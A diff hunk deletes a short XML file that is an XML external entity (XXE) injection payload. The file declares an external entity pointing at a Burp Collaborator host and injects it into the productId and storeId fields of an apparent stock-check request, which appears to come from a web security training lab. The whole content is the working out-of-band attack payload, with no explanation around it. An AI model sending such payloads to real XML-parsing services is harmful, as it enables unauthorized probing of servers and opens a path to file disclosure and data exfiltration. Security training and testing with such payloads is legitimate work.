@@ -1,3 +1,0 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://vgf4b4ml2hw7f4x02f8ll4wnrex4lt.burpcollaborator.net"> ]>
-<stockCheck><productId>&xxe;</productId><storeId>&xxe;</storeId></stockCheck>
